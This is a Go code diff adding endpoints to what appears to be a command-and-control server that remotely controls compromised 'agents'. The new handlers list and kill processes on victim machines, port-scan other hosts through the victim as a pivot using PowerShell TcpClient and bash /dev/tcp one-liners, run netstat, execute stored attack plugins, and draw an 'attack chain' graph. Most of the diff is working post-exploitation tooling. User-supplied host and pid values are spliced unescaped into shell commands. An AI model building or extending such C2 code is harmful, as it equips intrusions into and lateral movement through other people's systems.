@@ -426,6 +426,13 @@ func (s *Server) c2xFileListCmd(w http.ResponseWriter, r *http.Request, agent, c
 		}
 	}
 	p = strings.Trim(p, "\"")
+	// Windows 会话收到 unix 形态路径（前端旧缓存/手输）→ 回主目录
+	if isWin && (strings.HasPrefix(p, "/") || p == "") {
+		p = "C:\\Users\\Public"
+	}
+	if !isWin && (p == "" || strings.HasPrefix(p, "C:")) {
+		p = "/root"
+	}
 	var execCmd string
 	if isWin {
 		execCmd = "dir /A \"" + p + "\""
@@ -867,6 +874,272 @@ func c2xParseEntries(out string, isWin bool) []classicEntry {
 	return entries
 }
 
+// ───────────────────────── FORANG 功能面板端点 ─────────────────────────
+
+// c2xProcList 进程列表（win=tasklist CSV，linux=ps aux）。
+func (s *Server) c2xProcList(w http.ResponseWriter, r *http.Request) {
+	id := r.URL.Query().Get("agent_id")
+	if id == "" {
+		writeErr(w, 400, "agent_id 必填")
+		return
+	}
+	isWin := s.c2IsWin(r.Context(), id)
+	var out string
+	var err error
+	if isWin {
+		out, err = s.c2ExecAndWait(r, id, "tasklist /FO CSV /NH")
+	} else {
+		out, err = s.c2ExecAndWait(r, id, "ps aux | head -120")
+	}
+	if err != nil {
+		writeErr(w, 502, "执行失败: "+err.Error())
+		return
+	}
+	type proc struct {
+		PID   string `json:"pid"`
+		Name  string `json:"name"`
+		Mem   string `json:"mem"`
+		Cmd   string `json:"cmd,omitempty"`
+	}
+	procs := []proc{}
+	for _, ln := range strings.Split(out, "\n") {
+		cl := strings.TrimSpace(strings.TrimRight(ln, "\r"))
+		if cl == "" {
+			continue
+		}
+		if isWin {
+			// "name.exe","1234","Console","1","12,776 K"
+			m := procCSVRe.FindStringSubmatch(cl)
+			if m == nil {
+				continue
+			}
+			procs = append(procs, proc{PID: m[2], Name: m[1], Mem: m[3]})
+			continue
+		}
+		f := strings.Fields(cl)
+		if len(f) < 11 || f[1] == "PID" {
+			continue
+		}
+		procs = append(procs, proc{PID: f[1], Cmd: strings.Join(f[10:], " ")[:c2xMin(90, len(strings.Join(f[10:], " ")))], Mem: f[3]})
+	}
+	s.c2GraphAction(id, "collect", "进程列表采集", fmt.Sprintf("%d 进程", len(procs)), true)
+	writeJSON(w, 200, map[string]any{"procs": procs, "is_win": isWin})
+}
+
+var procCSVRe = regexp.MustCompile(`^"([^"]+)","(\d+)","[^"]*","\d+","([^"]*)"$`)
+
+func c2xMin(a, b int) int { if a < b { return a }; return b }
+
+// c2xProcKill 进程终止。
+func (s *Server) c2xProcKill(w http.ResponseWriter, r *http.Request) {
+	var b struct {
+		AgentID string `json:"agent_id"`
+		PID     string `json:"pid"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.AgentID == "" || b.PID == "" {
+		writeErr(w, 400, "agent_id 与 pid 必填")
+		return
+	}
+	var cmd string
+	if s.c2IsWin(r.Context(), b.AgentID) {
+		cmd = "taskkill /F /PID " + b.PID
+	} else {
+		cmd = "kill -9 " + b.PID
+	}
+	out, err := s.c2ExecAndWait(r, b.AgentID, cmd)
+	msg := "killed " + b.PID
+	if err != nil {
+		msg = "[失败] " + err.Error()
+	} else if strings.TrimSpace(out) != "" {
+		msg = out
+	}
+	s.c2Audit(b.AgentID, "", "proc_kill", "pid="+b.PID)
+	s.c2GraphAction(b.AgentID, "action", "Kill 进程 "+b.PID, msg, err == nil)
+	writeJSON(w, 200, map[string]any{"output": msg})
+}
+
+// c2xNetScan 端口扫描（以目标机为跳板，win=PS TcpClient / linux=bash /dev/tcp）。
+func (s *Server) c2xNetScan(w http.ResponseWriter, r *http.Request) {
+	var b struct {
+		AgentID string `json:"agent_id"`
+		Host    string `json:"host"`
+		Ports   []int  `json:"ports"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.AgentID == "" || b.Host == "" || len(b.Ports) == 0 {
+		writeErr(w, 400, "agent_id/host/ports 必填")
+		return
+	}
+	isWin := s.c2IsWin(r.Context(), b.AgentID)
+	var cmd string
+	if isWin {
+		pl := make([]string, len(b.Ports))
+		for i, p := range b.Ports {
+			pl[i] = fmt.Sprint(p)
+		}
+		script := fmt.Sprintf("foreach($p in @(%s)){ $c=New-Object Net.Sockets.TcpClient; $a=$c.BeginConnect('%s',$p,$null,$null); if($a.AsyncWaitHandle.WaitOne(900) -and $c.Connected){ Write-Output ('OPEN %s:' + $p) }; $c.Close() }; Write-Output 'SCAN-DONE'",
+			strings.Join(pl, ","), b.Host, b.Host)
+		cmd = psOneLiner(script)
+	} else {
+		pl := make([]string, len(b.Ports))
+		for i, p := range b.Ports {
+			pl[i] = fmt.Sprint(p)
+		}
+		cmd = fmt.Sprintf(`bash -c 'for p in %s; do (echo >/dev/tcp/%s/\$p) 2>\/dev/null && echo "OPEN %s:\$p"; done; echo SCAN-DONE'`,
+			strings.Join(pl, " "), b.Host, b.Host)
+	}
+	out, err := s.c2ExecAndWait(r, b.AgentID, cmd)
+	if err != nil {
+		out = "[失败] " + err.Error()
+	}
+	s.c2Audit(b.AgentID, "", "portscan", b.Host)
+	s.c2GraphAction(b.AgentID, "action", "端口扫描 "+b.Host+"（"+fmt.Sprint(len(b.Ports))+" 端口）", truncateStr(out, 1200), err == nil)
+	writeJSON(w, 200, map[string]any{"output": out})
+}
+
+// c2xNetNetstat netstat。
+func (s *Server) c2xNetNetstat(w http.ResponseWriter, r *http.Request) {
+	var b struct {
+		AgentID string `json:"agent_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.AgentID == "" {
+		writeErr(w, 400, "agent_id 必填")
+		return
+	}
+	var cmd string
+	if s.c2IsWin(r.Context(), b.AgentID) {
+		cmd = "netstat -ano"
+	} else {
+		cmd = "netstat -antp 2>/dev/null | head -80 || netstat -an | head -80"
+	}
+	out, err := s.c2ExecAndWait(r, b.AgentID, cmd)
+	if err != nil {
+		out = "[失败] " + err.Error()
+	}
+	writeJSON(w, 200, map[string]any{"output": out})
+}
+
+// c2xPluginsList 插件列表。
+func (s *Server) c2xPluginsList(w http.ResponseWriter, r *http.Request) {
+	rows, err := s.m.PG().Query(`SELECT id, name, COALESCE(description,''), builtin FROM c2_plugins ORDER BY builtin DESC, id`)
+	if err != nil {
+		writeErr(w, 500, err.Error())
+		return
+	}
+	defer rows.Close()
+	type plugin struct {
+		ID          int64  `json:"id"`
+		Name        string `json:"name"`
+		Description string `json:"description"`
+		Builtin     bool   `json:"builtin"`
+	}
+	out := []plugin{}
+	for rows.Next() {
+		var it plugin
+		if err := rows.Scan(&it.ID, &it.Name, &it.Description, &it.Builtin); err != nil {
+			continue
+		}
+		out = append(out, it)
+	}
+	writeJSON(w, 200, map[string]any{"plugins": out})
+}
+
+// c2xPluginsRun 执行插件（OS 感知命令集，逐条聚合）。
+func (s *Server) c2xPluginsRun(w http.ResponseWriter, r *http.Request) {
+	var b struct {
+		AgentID  string `json:"agent_id"`
+		PluginID int64  `json:"plugin_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.AgentID == "" || b.PluginID <= 0 {
+		writeErr(w, 400, "agent_id/plugin_id 必填")
+		return
+	}
+	var name string
+	var cmdsB, wcmdsB []byte
+	if err := s.m.PG().QueryRow(`SELECT name, commands, COALESCE(commands_win,'') FROM c2_plugins WHERE id=$1`, b.PluginID).
+		Scan(&name, &cmdsB, &wcmdsB); err != nil {
+		writeErr(w, 404, "插件不存在")
+		return
+	}
+	isWin := s.c2IsWin(r.Context(), b.AgentID)
+	var commands []string
+	if isWin && len(wcmdsB) > 4 {
+		_ = json.Unmarshal(wcmdsB, &commands)
+	}
+	if len(commands) == 0 {
+		if err := json.Unmarshal(cmdsB, &commands); err != nil || len(commands) == 0 {
+			writeErr(w, 500, "插件命令解析失败")
+			return
+		}
+	}
+	cli := c2Client()
+	type step struct {
+		Cmd    string `json:"cmd"`
+		Output string `json:"output"`
+		Error  string `json:"error,omitempty"`
+		MS     int64  `json:"ms"`
+	}
+	steps := []step{}
+	for _, cmd := range commands {
+		st := step{Cmd: cmd}
+		start := time.Now()
+		out, err := c2RunTaskWait(r.Context(), cli, b.AgentID, "exec", map[string]any{"cmd": cmd}, 25*time.Second)
+		st.MS = time.Since(start).Milliseconds()
+		if err != nil {
+			st.Error = err.Error()
+		} else {
+			st.Output = truncateStr(out, 60000)
+		}
+		steps = append(steps, st)
+	}
+	okCnt := 0
+	first := ""
+	for _, st := range steps {
+		if st.Error == "" {
+			okCnt++
+			if first == "" {
+				first = st.Output
+			}
+		}
+	}
+	s.c2Audit(b.AgentID, "", "plugin_run", name)
+	s.c2GraphAction(b.AgentID, "plugin", "插件 "+name+fmt.Sprintf("（%d/%d 条成功）", okCnt, len(steps)), truncateStr(first, 1200), okCnt > 0)
+	writeJSON(w, 200, map[string]any{"plugin": name, "steps": steps})
+}
+
+// c2xGraph 攻击链路图节点。
+func (s *Server) c2xGraph(w http.ResponseWriter, r *http.Request) {
+	id := r.URL.Query().Get("agent_id")
+	if id == "" {
+		writeErr(w, 400, "agent_id 必填")
+		return
+	}
+	rows, err := s.m.PG().Query(`SELECT node_type, label, COALESCE(detail,''), status, created_at
+		FROM c2_graph_nodes WHERE session_id=$1 ORDER BY id DESC LIMIT 100`, id)
+	if err != nil {
+		writeErr(w, 500, err.Error())
+		return
+	}
+	defer rows.Close()
+	type node struct {
+		Type   string `json:"type"`
+		Label  string `json:"label"`
+		Detail string `json:"detail"`
+		Status string `json:"status"`
+		At     string `json:"at"`
+	}
+	out := []node{}
+	for rows.Next() {
+		var n node
+		var ts time.Time
+		if err := rows.Scan(&n.Type, &n.Label, &n.Detail, &n.Status, &ts); err != nil {
+			continue
+		}
+		n.At = ts.Format("01-02 15:04:05")
+		out = append(out, n)
+	}
+	writeJSON(w, 200, map[string]any{"nodes": out})
+}
+
 // ───────────────────────── 路由注册 ─────────────────────────
 
 func (s *Server) registerC2ClassicRoutes(mux *http.ServeMux) {
@@ -895,6 +1168,13 @@ func (s *Server) registerC2ClassicRoutes(mux *http.ServeMux) {
 	mux.HandleFunc("POST /api/tools/c2/classic/settings", s.c2xSettings)
 	mux.HandleFunc("POST /api/tools/c2/classic/issues/cleanup", s.c2xStubOK)
 	mux.HandleFunc("GET /api/tools/c2/classic/backup", s.c2xStubOK)
+	mux.HandleFunc("GET /api/tools/c2/classic/proc", s.c2xProcList)
+	mux.HandleFunc("POST /api/tools/c2/classic/proc/kill", s.c2xProcKill)
+	mux.HandleFunc("POST /api/tools/c2/classic/net/scan", s.c2xNetScan)
+	mux.HandleFunc("POST /api/tools/c2/classic/net/netstat", s.c2xNetNetstat)
+	mux.HandleFunc("GET /api/tools/c2/classic/plugins", s.c2xPluginsList)
+	mux.HandleFunc("POST /api/tools/c2/classic/plugins/run", s.c2xPluginsRun)
+	mux.HandleFunc("GET /api/tools/c2/classic/graph", s.c2xGraph)
 }
 
 func mustJSON(v any) json.RawMessage {
